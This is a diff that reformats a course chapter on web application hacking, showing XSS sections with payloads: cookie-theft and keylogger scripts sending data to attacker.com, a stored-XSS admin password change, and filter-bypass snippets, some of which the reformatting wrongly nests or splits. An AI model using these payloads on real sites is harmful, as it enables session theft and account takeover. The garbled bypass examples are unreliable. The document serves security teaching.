@@ -1,10 +1,20 @@
 ---
-title: "Web Application Hacking"
+title: 'Web Application Hacking'
 subtitle: "OWASP Top 10, Burp Suite, SQL injection, XSS, SSRF, IDOR, command injection — the complete web attacker's toolkit."
 chapter: 7
-level: "intermediate"
-readingTime: "20 min"
-topics: ["OWASP", "SQL injection", "XSS", "SSRF", "IDOR", "Burp Suite", "command injection", "web hacking"]
+level: 'intermediate'
+readingTime: '20 min'
+topics:
+  [
+    'OWASP',
+    'SQL injection',
+    'XSS',
+    'SSRF',
+    'IDOR',
+    'Burp Suite',
+    'command injection',
+    'web hacking'
+  ]
 ---
 
 <script>
@@ -153,20 +163,25 @@ XSS injects JavaScript into pages viewed by other users.
 <p>Search results for: <?php echo $_GET['q']; ?></p>
 
 <!-- Payload in URL -->
-?q=<script>alert(1)</script>
-?q=<img src=x onerror=alert(1)>
-?q="><script>alert(document.cookie)</script>
+?q=
+<script>
+	alert(1);
+</script>
+?q=<img src="x" onerror="alert(1)" /> ?q=">
+<script>
+	alert(document.cookie);
+</script>
 
 <!-- Cookie theft payload -->
 <script>
-fetch('https://attacker.com/steal?c=' + document.cookie)
+	fetch('https://attacker.com/steal?c=' + document.cookie);
 </script>
 
 <!-- Keylogger -->
 <script>
-document.onkeypress = function(e) {
-  fetch('https://attacker.com/log?k=' + e.key);
-}
+	document.onkeypress = function (e) {
+		fetch('https://attacker.com/log?k=' + e.key);
+	};
 </script>
 ```
 
@@ -177,17 +192,17 @@ Payload stored in database, executes for every user who views it:
 ```html
 <!-- In a comment field, forum post, profile bio -->
 <script>
-var xhr = new XMLHttpRequest();
-xhr.open('GET', 'https://attacker.com/steal?cookie=' + document.cookie, true);
-xhr.send();
+	var xhr = new XMLHttpRequest();
+	xhr.open('GET', 'https://attacker.com/steal?cookie=' + document.cookie, true);
+	xhr.send();
 </script>
 
 <!-- CSRF via stored XSS — change admin password -->
 <script>
-var xhr = new XMLHttpRequest();
-xhr.open('POST', '/admin/change-password', true);
-xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-xhr.send('password=hacked&confirm=hacked');
+	var xhr = new XMLHttpRequest();
+	xhr.open('POST', '/admin/change-password', true);
+	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+	xhr.send('password=hacked&confirm=hacked');
 </script>
 ```
 
@@ -204,21 +219,31 @@ document.getElementById('output').innerHTML = location.hash.substring(1);
 
 ```html
 <!-- Filter bypasses when <script> is blocked -->
-<img src=x onerror=alert(1)>
-<svg onload=alert(1)>
-<iframe srcdoc="<script>alert(1)</script>">
-<body onload=alert(1)>
+<img src="x" onerror="alert(1)" />
+<svg onload="alert(1)">
+	<iframe srcdoc="<script>alert(1)</script>">
+		<body onload="alert(1)">
+			<!-- When alert is filtered -->
+			<script>
+				confirm(1);
+			</script>
+			<script>
+				prompt(1);
+			</script>
 
-<!-- When alert is filtered -->
-<script>confirm(1)</script>
-<script>prompt(1)</script>
+			<!-- HTML entities bypass -->
+			<script>
+				&#x61;lert(1)
+			</script>
+			<script>
+				&#97;lert(1)
+			</script>
 
-<!-- HTML entities bypass -->
-<script>&#x61;lert(1)</script>
-<script>&#97;lert(1)</script>
-
-<!-- JavaScript URL -->
-<a href="javascript:alert(1)">click</a>
+			<!-- JavaScript URL -->
+			<a href="javascript:alert(1)">click</a>
+		</body>
+	</iframe>
+</svg>
 ```
 
 ## Server-Side Request Forgery (SSRF)
@@ -279,6 +304,7 @@ GET /download?file=report-user-1235.pdf
 ```
 
 **Testing systematically with Burp Intruder:**
+
 1. Capture request with numeric ID
 2. Send to Intruder → mark ID as position
 3. Use Numbers payload: 1 to 1000
@@ -404,4 +430,3 @@ Recommended order:
 ```
 
 Complete these labs and you'll be at OSCP web-application level.
-
